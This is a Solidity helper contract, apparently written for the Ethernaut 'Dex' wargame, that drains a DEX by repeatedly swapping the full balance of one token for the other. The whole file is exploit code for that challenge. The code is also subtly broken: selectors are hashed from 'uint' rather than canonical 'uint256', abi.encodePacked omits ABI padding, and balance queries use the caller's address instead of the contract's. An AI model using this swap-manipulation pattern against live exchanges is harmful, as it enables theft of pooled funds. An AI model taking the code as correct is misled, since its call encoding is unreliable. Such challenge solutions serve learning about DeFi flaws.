contracts/Ethernaut/DexHelper.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Library.sol";

contract DexHelper {
    address dexAddr;
    bytes4 constant approveSig = bytes4(keccak256("approve(address,uint)"));
    bytes4 constant swapSig = bytes4(keccak256("swap(address,address,uint)"));
    bytes4 constant balanceOfSig = bytes4(keccak256("balanceOf(address,address)"));
    bytes4 constant token1Sig = bytes4(keccak256("token1()"));
    bytes4 constant token2Sig = bytes4(keccak256("token2()"));

    constructor(address _dexAddr) public {
        dexAddr = _dexAddr;
        
        (bool success,) = dexAddr.call(abi.encodePacked(approveSig, msg.sender, uint(10000000)));
        require(success, "approve call failed");
    }

    function oneTurn() public {
        (bool success, bytes memory returnedData) = dexAddr.call(abi.encodePacked(token1Sig));
        require(success, "token1 call failed");
        address token1 = address(bytes20(Library.getFirst32Bytes(returnedData)));

        (success, returnedData) = dexAddr.call(abi.encodePacked(token2Sig));
        require(success, "token2 call failed");
        address token2 = address(bytes20(Library.getFirst32Bytes(returnedData)));
        
        (success, returnedData) = dexAddr.call(abi.encodePacked(balanceOfSig, msg.sender, token1));
        require(success, "balanceOf call failed");
        uint balance1 = uint(Library.getFirst32Bytes(returnedData));

        (success, returnedData) = dexAddr.call(abi.encodePacked(swapSig, token1, token2, balance1));
        require(success, "swap call failed");

        (success, returnedData) = dexAddr.call(abi.encodePacked(balanceOfSig, msg.sender, token2));
        require(success, "balanceOf call failed");
        uint balance2 = uint(Library.getFirst32Bytes(returnedData));

        (success, returnedData) = dexAddr.call(abi.encodePacked(swapSig, token2, token1, balance2));
        require(success, "swap call failed");
    }
}

